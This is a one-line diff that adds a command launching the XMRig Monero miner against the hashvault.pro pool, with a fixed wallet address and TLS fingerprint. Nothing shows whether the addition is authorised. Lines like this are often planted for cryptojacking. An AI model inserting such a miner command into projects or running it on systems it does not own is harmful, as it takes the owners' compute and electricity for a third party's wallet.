@@ -1,0 +1,1 @@
+./xmrig --url singapore01.hashvault.pro:443 --user 8Ab7zfUyQYh22eHzh9HAqiF7aTU54tZ2z5YcAzwEgLV1TVGRUxDxHFmC1rKLyjkn4b7JfmER1Yk9iU6kVohRC543QXWyytY --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
